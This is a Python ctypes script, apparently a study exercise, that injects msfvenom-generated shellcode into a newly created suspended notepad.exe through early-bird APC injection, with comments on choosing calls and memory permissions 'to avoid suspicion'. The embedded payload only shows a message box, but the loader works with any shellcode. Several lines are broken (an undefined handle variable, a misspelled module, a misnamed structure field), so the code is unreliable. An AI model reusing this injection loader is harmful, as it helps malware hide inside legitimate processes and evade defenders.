'''
instead of utilizing an existing PID, 
create a new process and inject into that
'''

from ctypes import *
from ctypes import wintypes
import subprocess

'''
Win32 API's:
VirtualAllocEx
CreateRemoteThread
WriteProcessMemory
VirtualProtectEx - changes the protection of a region of committed pages in the virtual space of a specified process
CreateProcess
QueueUserAPC - adds a usermode asynchronous procedure call object to the APC queue of the specified thread
  (When an APC is queued to a thread, the system issues a software interrupt, and the next time the thread is scheduled, it will run the APC function.)
'''

kernel32 = windll.kernel32
#LPCSTR = c_char_p
SIZE_T = c_size_t
LPSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

CreateRemoteThread = kernel32.CreateRemoteThread 
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD) 
CreateRemoteThread.restype = wintypes.HANDLE

VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype = wintypes.BOOL

'''
subprocess is best for simple use cases.
if one wants to hide the process or control
which DLL's are attached, subprocess is not
as elegant a solution.

process = subprocess.Popen(["notepad.exe"])
print(f"PID: {process.pid}")

'''

class _SECURITY_ATTRIBUTES(Structure):
  _fields_ = [("nLength", wintypes.DWORD), 
              ("IpSecurityDescriptor", wintypes.LPVOID), 
              ("bInheritHandle", wintypes.BOOL)]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

#STARTUPINFO Structure allows for fine-grained Process Creation control
class STARTUPINFO(Structure):
  _fields = [("cb", wintypes.DWORD), 
             ("lpReserved", LPSTR), 
             ("lpDesktop", LPSTR), 
             ("lpTitle", LPSTR), 
             ("dwX", wintypes.DWORD), 
             ("dwY", wintypes.DWORD), 
             ("dwXSize", wintypes.DWORD), 
             ("dwYSize", wintypes.DWORD), 
             ("dwXCountChars", wintypes.DWORD), 
             ("dwYCountChars", wintypes.DWORD), 
             ("dwFillAttribute", wintypes.DWORD), 
             ("dwFlags", wintypes.DWORD), 
             ("wShowWindow", wintypes.DWORD), 
             ("cbReserved2", wintypes.DWORD), 
             ("lpReserved2", LPBYTE), 
             ("hStdInput", wintypes.HANDLE), 
             ("hStdOutput", wintypes.HANDLE), 
             ("hStdError", wintypes.HANDLE),]

#important information for process injection
class PROCESS_INFORMATION(Structure):
  _fields_ = [("hProcess", wintypes.HANDLE), 
              ("hThread", wintypes.HANDLE), 
              ("dwProcessId", wintypes.DWORD), 
              ("dwThreadId", wintypes.DWORD),]

'''
if you want to know more about why you just had to type this by hand, refer to the following MSDN pages:
CreateProcessA, STARTUPINFOA, PROCESS_INFORMATIONA
STARTUPINFO and PROCESS_INFORMATION must be defined in order to properly define & use CreateProcess
'''

CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
#MSDN gives LPSTARTUPINFOA & LPPROCESS_INFORMATION, therefore pointers are used
CreateProcessA.restype = wintypes.BOOL

#msfvenom -a x64 -p windows/x64/messagebox TITLE=hello TEXT=world -f py
buf =  b""
buf += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00"
buf += b"\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"
buf += b"\x48\x8b\x52\x60\x3e\x48\x8b\x52\x18\x3e\x48\x8b"
buf += b"\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48\x0f\xb7\x4a"
buf += b"\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
buf += b"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
buf += b"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
buf += b"\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
buf += b"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31"
buf += b"\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75"
buf += b"\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd6"
buf += b"\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
buf += b"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
buf += b"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e"
buf += b"\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20"
buf += b"\x41\x52\xff\xe0\x58\x41\x59\x5a\x3e\x48\x8b\x12"
buf += b"\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1\x00\x00\x00"
buf += b"\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
buf += b"\x85\x04\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
buf += b"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
buf += b"\x56\xff\xd5\x77\x6f\x72\x6c\x64\x00\x68\x65\x6c"
buf += b"\x6c\x6f\x00"

def verify(x):
  if not x:
    raise WinError()

#create process for shellcode injection

startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)
startup_info.dwFlags = 1
startup_info.wShowWindow = 1

process_info = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_SUSPENDED | CREATE_NO_WINDOW, None, None, byref(startup_info), byref(process_info))
verify(created)

pid = process_info.dwProcessId
h_process = process_info.hProcess
thread_id = process_info.dwThreadId
h_thread = process_info.hThread

#allocate memory within process
#RW only to avoid suspicion

remote_memory = VirtualAllocEx(handle, False, len(buf), MEM_COMMIT, PAGE_READWRITE)
verify(remote_memory)

write = WriteProcessMemory(h_process, remote_memory, buf, len(buf))
verify(write)

PAGE_EXECUTE_READ = 0x20
old_prot = wintypes.DWORD(0)

#change memory space to RX
protect = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_prot))
verify(protect)

#execute shellcode
#rthread = CreateRemoteThread(h_process, None, 0, remote_memory, None, EXECUTE_IMMEDIATELY, None)
#verify(rthread)

#Queue a new thread via QueueUserAPC
#typically a less suspicious API Call

PAPCFUNC = CFUNCTYPE(None, POINTER(win.types.ULONG))

QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE, )
ResumeThread.restype = wintypes.BOOL

#Queue the thread located within the remote_memory variable and identified by h_thread
rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)

#change thread state from suspended to running, which in turn will execute the shellcode and TERM itself
rthread = ResumeThread(h_thread)
verify(rthread)






